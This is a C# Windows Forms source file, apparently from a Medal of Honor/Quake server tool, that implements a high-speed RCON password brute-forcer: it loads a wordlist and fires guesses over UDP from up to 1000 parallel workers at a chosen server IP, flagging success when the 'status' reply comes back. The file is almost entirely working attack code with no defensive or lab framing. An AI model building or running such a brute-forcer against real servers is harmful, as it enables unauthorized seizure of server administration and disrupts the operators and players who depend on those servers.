using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mohaa_server_tool;


namespace QuakeRcon
{
    public partial class Form1 : Form
    {
        private string wordlistFilePath;
        public string IP { get; set; }
        private CancellationTokenSource cts;
        private const int MAX_THREADS = 1000;
        private ConcurrentQueue<string> passwordQueue;

        public Form1()
        {
            InitializeComponent();
            cts = new CancellationTokenSource();
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            lblSelectedIP.Text = $"Target IP: {IP}";
        }

        private void UpdateUI(Action action)
        {
            if (this.IsDisposed || !this.IsHandleCreated) return;

            try
            {
                if (this.InvokeRequired)
                {
                    this.Invoke(new Action(() => {
                        action();
                        // نضمن أن أي عنصر تم تحديثه لا يفقد لونه (خاصة في الـ Brute-force السريع)
                        // lblMessage.ForeColor = this.ForeColor; 
                    }));
                }
                else
                {
                    action();
                }
            }
            catch { }
        }
        // دالة تحديث الثيم يدوياً من نافذة الإعدادات
        public void RefreshThemeExplicitly(string themeName)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => RefreshThemeExplicitly(themeName)));
                return;
            }

            this.SuspendLayout();
            try
            {
                // 1. تطبيق الثيم الأساسي (الخلفية والألوان العامة)
                ThemeManager.ApplyTheme(this, null, themeName);

                // 2. تحديث العناصر المتداخلة (التي تستخدم دالتك الخاصة)
                ApplyThemeRecursively(this, this.ForeColor);

                // 3. تأكد من تلوين الـ ProgressBar أو أي عناصر أخرى لم يشملها المانجر
                // progressBar1.ForeColor = ... 
            }
            finally
            {
                this.ResumeLayout(true);
                this.Refresh();
            }
        }
        private async void btnSend_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(wordlistFilePath))
            {
                MessageBox.Show("Please select a wordlist file first.");
                return;
            }

            if (string.IsNullOrEmpty(IP) || !IPAddress.TryParse(IP.Split(':')[0], out _))
            {
                MessageBox.Show("Please enter a valid IP address.");
                return;
            }

            if (!int.TryParse(IP.Split(':')[1], out int port))
            {
                MessageBox.Show("Please enter a valid port number.");
                return;
            }
            
            // عرض رسالة أولية فقط بدون تنفيذ شيء ثقيل
            UpdateUI(() => lblMessage.Text = "Reading wordlist...");

            // اقرأ الملف في الخلفية (لتجنب اللاج)
            List<string> lines = await Task.Run(() => File.ReadLines(wordlistFilePath).ToList());
            passwordQueue = new ConcurrentQueue<string>(lines);

            int totalPasswords = passwordQueue.Count;
            int remainingPasswords = totalPasswords;

            UpdateUI(() =>
            {
                lblTotalPasswords.Text = $"Total Passwords: {totalPasswords}";
                lblRemainingPasswords.Text = $"Remaining: {remainingPasswords}";
                lblMessage.Text = "Starting ultra-fast RCON brute-force...";
                progressBar1.Minimum = 0;
                progressBar1.Maximum = totalPasswords;
                progressBar1.Value = 0;
            });

            cts = new CancellationTokenSource();
            var token = cts.Token;
            var foundPassword = new ConcurrentBag<string>();

            await Task.Run(() =>
            {
                Parallel.For(0, MAX_THREADS, new ParallelOptions { MaxDegreeOfParallelism = MAX_THREADS }, i =>
                {
                    if (token.IsCancellationRequested)
                        return;

                    using (RCON rcon = new RCON(IP.Split(':')[0], port))
                    {
                        while (passwordQueue.TryDequeue(out string password) && !token.IsCancellationRequested)
                        {
                            string response = rcon.SendCommand(password.Trim());

                            if (IsValidResponse(response))
                            {
                                foundPassword.Add(password.Trim());
                                UpdateUI(() =>
                                {
                                    lblMessage.Text = $"RCON Password Found: {password.Trim()}";
                                    progressBar1.Value = progressBar1.Maximum;
                                    lblRemainingPasswords.Text = "Remaining: 0";
                                });
                                cts.Cancel();
                                return;
                            }
                            else
                            {
                                Interlocked.Decrement(ref remainingPasswords);
                                UpdateUI(() =>
                                {
                                    progressBar1.Value = Math.Min(progressBar1.Value + 1, progressBar1.Maximum);
                                    lblRemainingPasswords.Text = $"Remaining: {remainingPasswords}";
                                });
                            }
                        }
                    }
                });

                if (foundPassword.Count == 0 && !token.IsCancellationRequested)
                {
                    UpdateUI(() => lblMessage.Text = "No valid password found.");
                }
            }, token);
        }


        private void btnStop_Click(object sender, EventArgs e)
        {
            cts.Cancel();
            UpdateUI(() => lblMessage.Text = "Operation Canceled.");
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                wordlistFilePath = openFileDialog.FileName;
                txtWordlistPath.Text = wordlistFilePath;
            }
        }

        private bool IsValidResponse(string response)
        {
            return response.Contains("map:") && response.Contains("num score ping name");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            cts.Cancel();
            UpdateUI(() => lblMessage.Text = "🚫 Search Stopped.");
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            cts.Cancel(); 
        }

        // داخل Form1.cs

        private void Form1_Load(object sender, EventArgs e)
        {
            var main = Application.OpenForms["MainForm"] as MainForm;
            if (main?.CurrentSettings != null)
            {
                this.SuspendLayout();

                // 1. تطبيق الثيم الأساسي من المانجر الخاص بك
                ThemeManager.ApplyTheme(this, null, main.CurrentSettings.SelectedTheme);

                // 2. تغلغل الثيم داخل الـ GroupBoxes والـ Panels
                ApplyThemeRecursively(this, this.ForeColor);

                this.ResumeLayout(true);
            }
        }

        private void ApplyThemeRecursively(Control container, Color foreColor)
        {
            foreach (Control ctrl in container.Controls)
            {
                // تلوين العناصر النصية وضمان شفافية الخلفية
                if (ctrl is Label || ctrl is CheckBox || ctrl is GroupBox)
                {
                    ctrl.ForeColor = foreColor;
                    if (ctrl is Label || ctrl is CheckBox)
                        ctrl.BackColor = Color.Transparent;
                }

                // إذا كان العنصر يحتوي على عناصر فرعية، نطبق الثيم عليها أيضاً
                if (ctrl.HasChildren)
                    ApplyThemeRecursively(ctrl, foreColor);
            }
        }
    }

    class RCON : IDisposable
    {
        private Socket socket;
        private IPEndPoint remoteEndPoint;
        private byte[] bufferSend = new byte[512];
        private byte[] bufferReceive = new byte[512];

        public RCON(string gameServerIP, int gameServerPort)
        {
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
            {
                SendTimeout = 100,
                ReceiveTimeout = 100
            };

            remoteEndPoint = new IPEndPoint(IPAddress.Parse(gameServerIP), gameServerPort);
        }

        public string SendCommand(string password, string command = "status")
        {
            try
            {
                string fullCommand = $"rcon {password} {command}";
                byte[] bufferTemp = Encoding.ASCII.GetBytes(fullCommand);

                Array.Clear(bufferSend, 0, bufferSend.Length); // ✅ تصفير البفر

                bufferSend[0] = 255;
                bufferSend[1] = 255;
                bufferSend[2] = 255;
                bufferSend[3] = 255;
                bufferSend[4] = 2;

                Buffer.BlockCopy(bufferTemp, 0, bufferSend, 5, bufferTemp.Length);

                int commandLength = 5 + bufferTemp.Length; // ✅ إرسال فقط الطول الفعلي
                socket.SendTo(bufferSend, 0, commandLength, SocketFlags.None, remoteEndPoint);

                int received = socket.Receive(bufferReceive);

                return Encoding.ASCII.GetString(bufferReceive, 0, received);
            }
            catch (SocketException)
            {
                return "Socket error";
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }


        public void Dispose()
        {
            socket?.Close();
            socket?.Dispose();
        }
    }
}
